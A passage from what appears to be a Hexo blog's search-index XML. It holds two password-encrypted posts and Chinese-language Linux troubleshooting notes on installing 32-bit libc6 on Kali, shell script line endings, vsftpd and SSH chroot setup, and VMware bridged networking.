bd3f2a5c35d74cdd7390df54e21b4df1cc438ebf2696c938cb20158c6b1ade1e9601760e9472ae54ca936bce07da4b4635c8f70d7ae1bca213eb3a7bd86bc855fdeafb7967f4bacf1666e5bc2aaf324ed562fa50e78a8dcdb19f84c74c814a4e29281c0d12a3011336ee196338edc7bf9a691240a1550b7d77e43655cfb771b0d4df9b28b55cfec244e34abd4d577bb17c22002c61dbbbe06ed956891c805b1d56e65b863b9dfc951dfe94a108c2baa0ba33d9f0bac0afe10c6f917a627e9c35b64fd72e766abae5d546d1da3938516c7f1536bb5837d487ec51f021e3194f0f10e915bf2d97f8810696c78508dd3cef794c8229a46bdd7d624b8fdfeebc31733d67d18a77bda7a88c85806aceb32757de9dc52ba02bec8d12ec096b41454341a078f2f87cd154b8f10c38e763c752e29829b52a00b6967fdd1656f91f38d03d80fa82515049a7c1b244996cd9c9b1ae68ebd96ff8eb4e21f66dda0a87d5f242c2e7df31e9fe088557cb2b8db6c0482e179c03062a4a9f687ca8fb76ad60e40a37cb410ee6cdcd7b6b9eb5486352bc9fcefd804972310ab0092ec68702267d4117c9d3282a8dd08cd96ff01b3e465e4a587184911dc00deb8b687698aa3a3e576d29e42ecd8c7458bf98bcfab23fbd9e35fa286ccde9b155e10f0f61cca91a63a4f474b44c58663648b61fc313997534a230a1cf756251f28aed30eb5e3e3f5437d75b6759e2de068f9d4b975c928be493f83174ab48bda1d8c84e89aade9acecaba22f4b96e2ac0cdf60c2fbdde0c95ddb5e772ad7b488c9b9bfeabdbf1a39f75755843e6dc1bdad4f959616896eaf5309ef8d4ae1aece48182e8f9b129c9a68301e57b3d7a2ae772e443a74394b097c90fb1acb0bfbc91cd7eb0190d867e2414769f9f441846a53853d63449bc0e8c9f6eae5c095e046cd6a3f0802b181f1c03d94aa0ca6e60b254b58afb6119e416bc29c45a111ded564f24a9ac998fde252e0c29257a8231d1c06d60cc82d762b0a2147afdd0e9c6efe8dd16521f7b1d2d3198b420b1b232907b9131f109201ccabee3bc34e3e23e06d7207a097d35f56891fe373e894012a2e61404cb607a9f72698e7f4f94da8bbcdb487f220a6e02ee7e0e6f2b6fc91ae6ac4c6678ab4df19227b09937c0d16381aab256254e45a3fc34a93ca5c850fcd2296a1b956ec5d6706e8b08d6d99bdd3e1c17e1b959dedfdde056e4bff1258503709f375dea0237e6b05c1b5d5086d1a716d982a339206b43c5cffead3decc642cf6bfc997a2b9b7657a619f848955576789374de4258914d71a4949c304809437d76da923c4a44b38fd957f368385e331fb5e1cfcb59a56bdd945cb8aa5b12276921673d725a20bf622b70b4439327c27e91ca95a59e7c06a22d37d51e2704cd86ec945a4c1aa5ee84d97d909ce4201c6bbcb6c268b92ef963015c412ad48ac2e969abb0754eb19c6856a8cc678ac3d9292b9435102ffb26f491fe51cbe316aed6d2ea71a40e5374e18af76ba34002051a48a1199337e3aa9fe252aa50aafa4b916aa98d4ad390bca77b103000b6f64c74b1dc1c653bfe69a3cd058f79911740a2aefa11c864755b2a6c92d0b3952445be252c7d671f23292af6ac68a357aa745246769c89f65188736858240db1a0217c92f21959bb5514ba2d190c31cd38d87e5359e85ead1a2afaa5f336f07b668d34682c0e6436ccdb05e776d77a2477531d3a2336722cde34a8bdb103384caa3438ed1d5d4ba300e09633280af5fb7a91adb94a0fd006401bba2ea29ce96eb49d070f381ff097c83c083e84e1c7a978e48d1238faa5cc59cf7f39bf292091afe419d973360f10eb256794afab31839cda84bcb9d803c1a7d03d41b36736e759c0f03e89168b156c36cd5023487b866040d1d49ff09a8efca9d0409119c41a7b61791a43914ddda2f424937e5070c321471c41f51f1f1c68f3be0c54744a064446e4ba6c4ca37a8db423ee13dfab90eb6e777f3c564347ff8e3fc9dd5026e36c69253f8adaf3ab92739e683ec305d4d5298d71c4107d214ddc3368e1d1527edfe6fd5a6346ea4378030dfa67cc63ffa3518eda687feca7d54e7368cc298ec910816c0466a4cbfd292efe8102f5e691f6b16c2462c310afbb6256dd3331b9f74e821d88ee2ed83eaee842139ebaa7db841c61619adcac1c17b5019804425867678d7d0ae58672f6af27444d9d3029000838d482af4146d3dfab2d5fe5ca551c28b9701b2f3b962122fc861cc14feb4ee79eeea532207975593aded2020a7ae962f48f1d1abfe965566ef996c302de77277998e80dabddcd3d4da9e5e63e260ec8fb085c3f0abe4ab788477b68f8ab865a09768bf063d55f89dc25976e3be17ada2c602c5935e147b920095c824c28906a0c796f6531f24824f4e11c963519f7e6d26ede7589696f80b139b2ae6b94a2e1532bf692754a06381c56adea4675738e7f52ca2342ade9095045a7955a66c29ad066b75678e2d3b3fc3b0d6f06718bcb70051334c17eda3b788a36dcfc2b0e998bc9826a3df77ced613f3d522a665b7d882c4e0281214690a203b7f296ebe0598a3bea740a8e7f6c0afee965cfd402426217514d4dad4ef00db63efc9a729af51e1a0eb11ac119a0218b0188d33243ba7ced812ccd766067bb8b479dceedb1fb96348b1ba8c517b3ba32e7b7b5e95dc6e78deaf2012061035d96eed7227026e0d30d6c86c342949326942d4d33a61268aad113e81bc94e340f866ffed46395168a2f898495dc45483400c20e0f800b6460c3cb5e8299a25e2e8f28f2e9976af0930c14770105a0c275fa2d1217cc08d465b89c0f21edfed76fc88065d242642475d4b92c809c52c53439035b4e8327b3ad35d5e4b58220690a94aa8e5e07298f3509b48f6d7c12379a404ac4e5b45c0e6cb6b18e9e702d98c909b7441a9ab65a2044c1660eeea33820d81b73420d5999b3b1ced0a2c18ac518072c81b5249c69f93c53a160b57500c7191f8abeb66400a52ef4ab138f8f03a19382a001ee9e78e4789adb498a013207cb78d7486ea576e216f3e9ed0da62ee8b7862857b5647b20347e5f3eb9e113d007acbb022c0790acaee8e4c9f92e5363e2539457833259235cf09ed6def00beb86631cb096b74bf87c0cc2692b3ebc7e98f8e9f3844b578c6abeafb6abf2f6740b4a9b0998a11c2f7641cb1790dc6569e2c5686f7e06be61606d454158c8682f62aecccfc748ef3fc70fac773d8bbed2c3ad015371bb7a0e1e5d0a699967d1a88c9598953fb448256978d1833b2b06f7ef678591a3b07581ac38866d31fea8c1320b09bc282d8af41e77fb700dc887e28f94387953653dd41bed51f3f73e19c83eaecd4ab96e32722eba99452b4f8fd3dd71d7570e8f7d7a9c4f5e5fa65177d4203aaf562150242b666fd5ef68ac2b0f7c723366bd42d497fd780c862e03c0135c1538b96317c098665e015738df4564fc622560e18d9ac17340a10ef2287929d97821f4aa7959e7ce3b0ff1ba4a9c593a59776fbbf08a8c7cb3426b6bd7bfbe02faf43dadff90f06965f676cd8eaceacd51cef6f57cf1844814da2c4df98723cc218bbd4e7ed1fd34bde35ed35323d1e01c8605cc7f520232306e5027d1a7593866c3d3cb7fbede6addaf8c5fe81ffca5fee98a59663010650f24521c4026cce4ff5d11efe935566834ede912b67dcdd67c47f0189a1fe4f1a2c24658f25dfe462bcc0764a38709ccfe91c56d2dfba64db2b6183b0dd14e2b7092f9907b04f9b6d14120f5ad59f3df2a78f89323d029a31f85ff88048d8e71f75a841f6b3969cf55e91912e14856fd8077a8f52be58d2e938c4bc87f0080ce759837d974d3b078c9e94a68f5a26d43e5cc5d597c8eaeb7cd6bf27bbf3079e7358ce12190e55597c81c8bf1f89877c39bfed40c46d5f8eb536f749bc91b037da6d1a80daffad9308f585bde11fc2a6f1cd094eb2c291958aab68bcc3130b3670228cf40905812bc9064d37dd62ee9be037c2ee31f9c1deec736abb6eb6ad2f607ec1a4c112a4483f572d1ade74844a8736e174074c3d57587c62a9a57022c03180f675690b6b42566707ab3df0db95715ac4ec400380d1ae582451672adbb732bd73522cdace82665a029910b40b77547d159899189a12f9e976d34d52730f1bf07c683fa931b7e62a314cce8fd865181a5dcdfe189984419820cf426ac2cbdd41cd8a9b7a4a3e55bbb11252a1741580e73c8b5f9bf740bb9528bb20997c360316d970bb940451b299228215f1b0b790466d8c018066eb69402a253c36191d490789327fbad426d0897c8bb9a19c93d4eefe27c8c4285488fe5e37bdc3cb69c2eda66e87b75d3e5f47c29cbc90af6a4d613ae0fb2a9c42680fbb85e51cba07f0fe6bc69ae78e4c211c11139ddd1ed9df1482bb1d5f023d3f93026686ace6e889bad916f800688de290304d62b856d1ed2d271da0fb199e39e32d359684c97d0dedfa90d7551b90d781eb4d982ef0c8818d4ce8e5f5a826112834e533543507121449dada5b353d6846e6ca6b6e24eb68e52d359b903f233fc1fd4332189d5ae3c1686fec24a823082fea5a8f9a55f9a64996e7c4226a230473705b20d081c0bae4acb760878b152379b266f70385772fac0ee6c6aa752512a2916d83d604676ba7a688dceb89de275595130b683953dc92a300dee7eb38a391c101574042a13164f21</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Development</category>
        <category>Project</category>
      </categories>
  </entry>
  <entry>
    <title>Kali 下的 ld-linux.so.2</title>
    <url>/2023/08/03/Solution/Linux/Kali%20%E4%B8%8B%E7%9A%84%20ld-linux.so.2/</url>
    <content><![CDATA[<h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>在给Kali安装silentEye时，运行下载得到的”.run”文件时提示报错：<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picturebed-1310517892.file.myqcloud.com/202308030041886.png"
                      alt="image-20230803001154850"
                ></p>
<p>明明有这个文件但运行时却找不到。查找资料发现是系统位版本与文件位版本不匹配，分别查看版本：<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picturebed-1310517892.file.myqcloud.com/202308030041054.png"
                      alt="image-20230803001312845"
                ></p>
<p>64位的系统所用的加载动态链接库的文件是 <code>/lib64/ld-linux-x86-64.so.2</code> ，这是个软链接，实际上是 <code>/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</code> 文件，直接用该加载器去运行”.run”文件会提示：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/home/sam/Public/silenteye-0.4.2.beta-ubuntu-12.04.run: error while loading shared libraries: /home/sam/Public/silenteye-0.4.2.beta-ubuntu-12.04.run: wrong ELF class: ELFCLASS32</span><br></pre></td></tr></table></figure></div>

<p>通过 <code>readelf -l silenteye-0.4.2.beta-ubuntu-12.04.run</code> 查看其文件特征会发现他需要 <code>/lib/ld-linux.so.2</code> 这样一个interpreter，猜测这是与前面64位的 <code>ld-linux-x86-64.so.2</code> 对应的文件，所以需要先查找64位文件依赖的包是什么：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">❯ dpkg -S ld-linux-x86-64.so.2</span><br><span class="line">libc6:amd64: /lib64/ld-linux-x86-64.so.2</span><br><span class="line">libc6:amd64: /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br></pre></td></tr></table></figure></div>

<p>该命令查找包含已安装的特定文件的包名称，可以看见是 <code>libc6:amd64</code> ，冒号后的是版本。这是64位linux的系统链接库包。</p>
<p>先打开系统对于32位库的支持，<code>sudo dpkg --print-architecture</code> 可以查看本机支持的架构版本，此处为 <code>amd64</code> ，我们需要打开 <code>i386(即32位)</code>：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">dpkg --add-architecture i386</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt dist-upgrade</span><br></pre></td></tr></table></figure></div>

<p>然后查看libc6有没有对应i386的包：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">❯ apt search libc6</span><br><span class="line">...</span><br><span class="line">libc6/kali-rolling,now 2.37-5 amd64 [installed]</span><br><span class="line">  GNU C Library: Shared libraries</span><br><span class="line"></span><br><span class="line">libc6-amd64/kali-rolling 2.37-5 i386</span><br><span class="line">  GNU C Library: 64bit Shared libraries <span class="keyword">for</span> AMD64</span><br></pre></td></tr></table></figure></div>

<p>amd64已安装，安装i386的即可（忽略了下面的带”-cross”的glibc包，应该是用于交叉编译的库包，但是不知道适不适用，因此不敢乱下）：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install libc6:i386</span><br></pre></td></tr></table></figure></div>

<p>下载完毕后会在 <code>/lib</code> 下发现 <code>ld-linux.so.2</code> 这个文件，对，它就是32位系统的动态链接加载器。再次运行”.run”文件发现可以成功，问题解决！</p>
<hr>
<p>也没完全解决，这个silenteye的安装器不支持kali，因此最后安装失败&#x3D; &#x3D;。</p>
]]></content>
      <categories>
        <category>Solution</category>
        <category>Linux</category>
      </categories>
  </entry>
  <entry>
    <title>Linux Issues</title>
    <url>/2023/09/28/Solution/Linux/Linux%20Issues/</url>
    <content><![CDATA[<h2 id="Debris"><a href="#Debris" class="headerlink" title="Debris"></a>Debris</h2><ul>
<li><p>CentOS-安装 jdk17：<a class="link"   href="https://blog.csdn.net/chenshm/article/details/124358714" >CentOS安装Jdk17 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
<li><p>更改 Linux 终端字体：[</p>
<p><a class="link"   href="https://zhuanlan.zhihu.com/p/90116800%EF%BC%8C" >https://zhuanlan.zhihu.com/p/90116800， <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://blog.csdn.net/starzhou/article/details/105493420" >https://blog.csdn.net/starzhou/article/details/105493420 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>]</p>
</li>
<li><p><code>xargs</code> 工具属于 <code>findutils</code> 包，安装时要装后者。</p>
</li>
<li><p>Linux 只支持 <code>/</code> 做系统路径分割符</p>
</li>
<li><p>运行 bash 脚本时出现如下报错：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">bash: &lt;sth&gt;.sh: /bin/bash^M: bad interpreter: No such file or directory</span><br></pre></td></tr></table></figure></div>

<p>有两种可能：</p>
<ol>
<li>可能是文件开头有误：<code>#!bin/bash</code> &#x3D;&gt; <code>#!/bin/bash</code></li>
<li>可能是文件格式不对，vim 编辑目标 sh 文件，<code>:set ff=unix</code></li>
</ol>
</li>
</ul>
<h2 id="Solutions"><a href="#Solutions" class="headerlink" title="Solutions"></a>Solutions</h2><h3 id="Linux无法挂载ISO9660文件系统"><a href="#Linux无法挂载ISO9660文件系统" class="headerlink" title="Linux无法挂载ISO9660文件系统"></a>Linux无法挂载ISO9660文件系统</h3><p>查看 <code>/proc/filesystems</code> 可以获得所有支持的文件系统，若其中没有iso9660，则加载该模块：<code>sudo modprobe iso9660</code></p>
<h3 id="配置vsftpd的用户目录"><a href="#配置vsftpd的用户目录" class="headerlink" title="配置vsftpd的用户目录"></a>配置vsftpd的用户目录</h3><p><a class="link"   href="https://blog.csdn.net/arnoldlu/article/details/19615435" >vsftpd设置用户目录 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>省流：将ftp用户的家目录全部配置为ftp目录即可。在chroot相关参数全部置为YES的前提下，vsftpd利用配置文件中指定的本地用户登录，登录后直接访问该用户的家目录。通过在”&#x2F;etc&#x2F;passwd”中设置ftp用户的shell为bin&#x2F;nologin可限制ftp用户的权限。</p>
<h3 id="SSH-Jail配置"><a href="#SSH-Jail配置" class="headerlink" title="SSH-Jail配置"></a>SSH-Jail配置</h3><p><a class="link"   href="https://linux.cn/article-8313-1.html" >使用 chroot 监狱限制 SSH 用户访问指定目录 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/yanggd1987/article/details/54310686" >ssh的chroot配置 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>使用root的时候要小心，一不小心删了 <code>/lib</code> 文件linux就直接寄啦</p>
<p><code>ldd /bin/ls | awk &#39;&#123; print $3 &#125;&#39; | grep &quot;/lib&quot; | sort | uniq</code> 筛选ls所需要的链接库文件路径</p>
<h3 id="VMware-桥接模式无法上网问题"><a href="#VMware-桥接模式无法上网问题" class="headerlink" title="VMware 桥接模式无法上网问题"></a>VMware 桥接模式无法上网问题</h3><p>重启网络的最原始手段：<code>/etc/init.d/network-manager restart</code> </p>
<p>参考：<a class="link"   href="https://blog.csdn.net/jacklang/article/details/53170318#:~:text=%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8E%E4%B8%BB%E6%9C%BA%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E7%9A%84%E5%8D%8F%E8%AE%AE%E5%8F%AB%E5%81%9A%20VMware,%E6%A1%A5%E6%8E%A5%E5%8D%8F%E8%AE%AE%EF%BC%88VMware%20Bridge%20protocol%EF%BC%89%EF%BC%8C%E6%89%80%E4%BB%A5%E6%8C%87%E5%AE%9A%E7%9A%84%E7%BD%91%E5%8D%A1%E5%BF%85%E9%A1%BB%E6%94%AF%E6%8C%81%E8%BF%99%E4%B8%AA%E5%8D%8F%E8%AE%AE%EF%BC%8C%E8%BF%99%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E7%BC%96%E8%BE%91%E9%80%82%E9%85%8D%E5%99%A8%E7%9A%84%E5%B1%9E%E6%80%A7%E6%9D%A5%E8%BF%9B%E8%A1%8C%E6%9B%B4%E6%94%B9%EF%BC%8C%E5%A6%82%E4%B8%8B%E5%9B%BE%E6%89%80%E7%A4%BA%E3%80%82" >虚拟机 VMware 桥接模式详解（翻译+部分原创） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>简单地说，设置桥接需要固定虚拟机的IP与主机同一网段，DNS服务器与网关则要完全一致，新版的ubuntu的网络配置更换成了netplan而不是教程中常出现的那些文件，因此需要一篇netplan配置教程：<a class="link"   href="https://zhuanlan.zhihu.com/p/46544606" >如何在 Linux 上使用网络配置工具 Netplan <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>但是配置完后仍旧不能出网，主机能ping通虚拟机，但反过来不行，直到看到一篇博客：<a class="link"   href="https://blog.csdn.net/m0_59802268/article/details/124177001?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-124177001-blog-78987312.t5_download_50w&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-124177001-blog-78987312.t5_download_50w&utm_relevant_index=2" >vmware 虚拟机桥接模式连不上网的罕见原因 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。一开始使用的是需要认证的校园网，切换了自己的热点就成功了，确实有够罕见的。</p>
]]></content>
      <categories>
        <category>Solution</category>
        <category>Linux</category>
      </categories>
  </entry>
  <entry>
    <title>定制与管理</title>
    <url>/2023/07/29/Solution/Custom/%E5%AE%9A%E5%88%B6%E4%B8%8E%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="dba8ef2285ef993e6b742c4b31f3a2d07420a93fe73d311f2576831c64fe7236">93f063693304a79e562da81abee9f022b69db7f51ea2ff5328702d813395c11f484e684f0cf96644a8e28fa77bbec8d51100f0ca6f1fb738e6ef677447fdfa39e72e79da284853e7e9b005571917f2fb2299b3201442f06de7a670fa9a162fef768842f1fc27f895f7ded250110c2f86fe57ad4efd88fc597fb0e7c4f208489c4f20265d3df5e09094ef0c3bf11c7fc67106e961e8b5d02e100b01852ebdcbe16de9a57eb78c2bd86e86fa3940e83e43e38e906d3ebe22395d5a4c03311e1abab55de1b568cd3bc4a13fbf0d43303c77b2295e3a90d7bc35df1770d7d0492f1b13caac6e9c86d0fd87d79fd1770000c285d43d41b19a5338d1d48390bc67b8e5c2dd6386a400920f1ca899e327e0e58c4b7cab6b60f646fc7d6d1e43a3b48a7169dd05c5a430e04b9269ec072b2c7411c04e99480b90f75ef4605958a838385eb62eb76378095489d08d9c213825a9a0fad0c24a17e6520918a5421d967fbb9c6625161a8034adc8b9c9890253ee401f4fb6170aead500b6b0897c4009ec1e9b87cc7314f2e149e47be70863054464f191b04977339a282e4fa374c1f3b33e6ea15c6730e823ba8cf6e1afae361347252cbddfa197fb5ecbb24f412d4d4fb99ec4d209fcb438cc2848e630c5595fad08b4fbcfebfd8d6b273c716298d054ab4c32b8fe4feb0d64aca7ee87b3a9461d214b2e6f42e72f1a2e358817f7fd5bdccafd351b066da0a8b9780b803533a441fb607624504047255180ab39f728fe8d53f9dc6c91e2da6f7f49d4a74a512ce657f36d8567d23b0a7011fe23fcff71e60b1abcc21a2620c121c7f5934acd8b37b6dacc0dded11ab35787c729fff213e61b122f3c3343932721adc02c4a7b3424dedf4876fb3be8bd336520668c58550ba503e425d4162aec3a8e3a3fa190b78600c1910a369a69f1337501ce03d890f4948ad23f0b40dcbd3531976cf228cc3e7723500d14ab2159d1974ce22c706c60a928b55c45fd5e7eac72169a6a68c31a08fb98f56928ac8e365b87b603b824479ae6afd06864d29bddb903d730e5254fb2ff44521d143622b45f60ba83df5ee14f39532744078144f27364cea2e13033ae92ebe48fb49dc077563d6110a24e76d1cf3c84aa5e41363e662f38cc4cf25bc71906532bfe1ee463f3de99f7e69d6370d220211fa7c9c719a13768af4af571ad121c099c02c6d3773f5aaa7b14032a490a89cfc53a6a659a3db288acbc4859eceeb45d992dd9e0b0c25a6b526e4f5a70bc4e97b919cb1faf4c61424a5c497df20f3eb78ec58c02b0faab10837d86dfa95fc5d17dce73348af27d673747f3498654bb2692c500fc043d034a53e04cce9e6ef6bb15836b2362b157e930b788865d4294e65a69d9147b9cfef9e692714da6cdff691288f1ff54743708b6e68916c9e2e813925c181afde470dcb0ad8d4b69df0b27c19b542019ef7dcadb0232616fb4c91a5dca85f56e9d7938e3e825c889f7b25a96c1d384bd395e65f8a75ef862228cd84fb29f2e1c5068e315d46936505e12cf8fae06089eb9f6622af0237a052a499f906186050c25430adc7ce0a62657a549361b26fd6d5586425ba22d84b041b95cbd2a8e852f289824444cf1b7fb66b9933e471cce802bf5104e8605e47caaca0f56d54412d58c9cb64c8650544430b383a5ab53ca216f8bb028bed154d54f1373ee362162529bfd7ff2f0a3cb7928a4e97233948b01f8e9bb5a766bed7e7602dd8601cfcc9d67c15d8b44977716a2effdff10309bd034df3c999858c575004c34e04d7cd5f9fc0785badfe505e084e48979fad0bb4319bf96a841d647c9968c044df556a93e834f15570bb6cc75849f244da4710b15ea5e00701b70deccb7914ad92bc320f62b66313b1aa469d137dcc1e7dd3b5bfece5103a3a11dbc9a8862611e8de6c808006ca70aa7e4b685b7d9b14181867db8373d0bc97f8f2a65328951b60772d629bf0e05210100f4ec2f487c2d015049da6a06edbe77094058c7457e6bc498582efb0013672dc5550640e0722b3ae7a6d0c55a18af751c0446e49c4b2727ea0b8f5f42dbe966a9fed9ee9114c55259cf8eb83f7d4e69335d64aa3abd11083f13c44548630bb75272227ae7452fadccbca72f6d8aad3f300463f22030e3a150cd190df0f7c6167318bb822e1d2829e35eae4a61699ff9fdac62e9f08e5b5589d586cb65b67d0ba4997f71df3ee596b0fa8bd6324cf6b466ab81c16fadbc0be592738761d133cc7468d51932ad0f3e05f1bfa1ac651cf3f84cb4b33e71360db30b156d9ab1e00df564b2d1ae9377d777b8bc0ba748e287164d91ef503e75aac8db57c33a245b455b9167616c45bdc354156f43581f12333475177e5ca70668a0ded03e86795d662275a669de673458207c23dda14cdda16a1e194ca7a20cf3c7013943afe2104c1870de1afd0192e8f7a0aa8d701e44abf3e2fa1245d4fce72a9ee4472953951d4c651cbf5f3b3b4f773351ce04d6d7dac8cf9faa443b3ae38d7646d1c1f6b3f46d4f4b7abd1bba4f920d03a79ad881aa1fb7c30c85c45faced2ce51b8f32c7bede1cd5c4ebc6c82a6fa9d745dc24760d9c4952c48d971443c856a9c38121b5f56385dbd7107843df3788f3118ff559a62ff3c265e145ae587b16a461d54e88c27220672c57bf4d6d07798fdabd03c1f4d0aa0cd0d7536d069c7edf20de0df2aee13a4f4b18ba711fcf420d8d9455d3f34baa30dc3338425d65cf3553cfabb49080f8afad5479f6c341dc272f81788222e7b5a6518d902c91f9b0686b3df0217ea840cd12e7f8419cf790b46e1ecddd77cdd79e6ae8e730cbfda997f3b67569ecfe1aa6ed693c5dc4bd5aae6b1a02455c14613872c6ead99bf80198e622c46b9d8108f4fdf8fccc3c027bed1efab0fe1699e440018c459702a1986caa755e5489853bd406a0e5ebac6b3cde5fa7943b3f3170a9d50568a17d820d4fbbe1d6acba24d71f7dc35196007bee2c30de3f9732605c43d3428d3a5c87be235d4db0f8c740c2dab370e054a8821b6946c27a5cc1f91098e4f473756b7d7e113abe98e9a304fba182423f34d09b9ff60fa09cfea3f49edf1e96b00ffbe7a100bea895829059f23721f4b06553666f016f3013bddc861adcfa37e90e45b3e900ad7223fad5cd26a95ae6b1de48143ed8bc6c145e92880d95ba38bb2023a9d14684de7302a88880b9f0776b0b89c4beae69a0f50ae5b0007ac14f27b29a557798285c91d9574a6c2a3a5f2ad330e2af9058ad6166776a42e2ef1e37e3122acfc85d17f34ca2266c0ca246a3a3ce2cb7f972589bad134dc709726ac5597217a4195136fb612e1c23b04e704b5502bbd3a57d2d5e3f79639cc0ed0de0fd5bfe6c9e18ac60e30199fdec7f24f8e164c65a34ec0c56c004a4d2c6ea28d13e0343cf46363ebf30eedf8d5e5ec2f3c254baade0955dd8ad170d74d4ebf816ba808f715d44671d4389824d0a4456356f891cf606a885a4a14eda9886712ff970158664357819539aab85e065206ac3395b8c0652f57b1a67f634ad30d4a3adcb7daa518b7c184e5c121d70e8053459f87bea1d7e713e3bee7970bd9334b3e7da6cf60ebb28c43ed8b06a5be2230eb17bf3b5477fcf8f15cff17bcddae8a3412971116de37c141563242e6b65e5fd1c99740bb93ebb32c6fc6e959caa52c30f66d8880d7703989dcbe4ff190130f73a54895e91cb16fc99c65ade19bb0d0da8643b51993a5db2e5eada8d1e4feebdaac7b36182536f16f54499484ff73c366e15da54175b9ba4c5d71cdf02f53f1c75777a1dbfba8fc96ec49872ef9770efeac5c8e2c0fdbcca6d907062a9e26ae84f0fc32cfadedf32eddb3aa23bc9f06cbcdec25170233de827bdf6b9a2c5c1c16e18ca77b589f0a2cef3e8a89b9da559e4aee680495b30d83c9ecb0b2fe06737e77afe8dd477c3c8525880bee0b3ba117a315c95b067ec4b19b95d2a3b6395e28eebe0f2d47609dd4f50c89058ed540ffd18a12fe3a22653c756d8196c250da2811f835d817bf5a5f3bbb4818299d94db225a8af7a9ae478bd7442582a7774fca6a9423bc93c2623261a0171e92e9986d9fac3ca605200d960b22f5492f5314fe52ff691f66e7f116ac1615449eede55abe4959d651bcdd91122b0f6489496ad0b384d709a4b90251d463ebc07965ce482736740682fb24d142f8df59391576e963a03fba2849f01bd73ba3c9d7101025badf075a6f42535ea15946b088ee3f582d0c6ed0c188125890c113bace41c84cb5836b036a8cb0834217ecaa3b597ae111b9946e4cea444a4bc323c5388ab6957cec62cbb6873b7559d7c072965995627761a9432aac583de1d6ad61cfb68298fedba41e258c6c1200eb06c36b4dc51fb5ef95a6bb24dbdddbda818e576eb5bb70c24fa69e526cd20560cbd40a7887974d98ff9b290cc180a18afaff48b9eac87ebcf568fee19708f33ecbbdd503c1c187c60ada4d5d7df50daf92aee75440932a3b84893d416ffa57eba0b81190601b0a26eb13ae3d4c64ffcde51d1c9f44c46359a0a08b4dd9cb69ddf4c342f292f7546038f4ae595cd3bd05e0a27f06fecffd63bf9ac366d764266ccd9d3795195c019c941274fc88be9eb34a989f0682719e903ba05d23fae657ef220d93ab840677bf20ab6ab9bbb7219eaba8823a4f9f85eec18d7105185b7a1a38419369a387ec8b101d78b0048194817d10b5e7c89b4730d01fab7793567857ed3c17a3fe401ac109cba06871fa34667299182126c95fd3231ee5a0e0bb72fffc33411650fb456bb928fe21bc34a623b4160e88a90c92efa10a024f369a525f5e58ebfd24d458092a07508c48e23242228a867b25d955f13d908fd5bbca68628b2a13a63e5c2ec0ba21614d58c2455d929d664821ff6674587c3ca712999c9e834024f8094d6b2509c18690adc09168b6b8e3799e378b6fb2c1e26d119e8d0972cd311a426c6e152c76d3e591b25aae3cb7a47470167034ab45525d7e3f430916d2a03658a4e99ee4d977e37fed1d54804bcc0c787350771939812ea7fbe1c038366f0dcc9782461c7ea9a63efd8cb06862fe751fbb1ce37a7276e4cc6467e725ee1dcd6108cab881a8e757d50221772df59590b33ff0d1ce8b82d7cd6798437c0c55ecaadacc131e6d6a6d05f0eb382b6187134c71bc2bf296621aa89500c6c7987237060c6b56ef615d408d9630f370ad6da9a927012d4abaf1b0ce837d40aa617849c4b2f8d37cc60c649d3725c5be9598a14c469a0073905fc3371d88d6534a142af92aecdee404e9caa0b66ea433914d14a9a84a9916a34dd93dab29d2498babd6661114e805cf9a404fba730075b3975069031944f90152546b46bc6c5cec2bfef1d6379bd3c0625a605165b43de0c7abbb4513b9eacaa908e638fb76e0b6ec4cc9f1b243c1b20fd6bdb2567b732884fd1ec6dc36066d4ae1fe3633c948725894a44e04dee408f9c436de71b2f1f220a8ab3381eba9d7235815b4b10ace37444117487bcd4823244d5a749601c07ae5fe146ab86c9d4cb95768eb72385d44f01291fc9dbe204aca938ca24436fd71104fa8404e503a41e7faee4132ab9e356151b83691ecebd70e9e62557f103ca27ffd14a7d3ed5291f0ef8515c105d4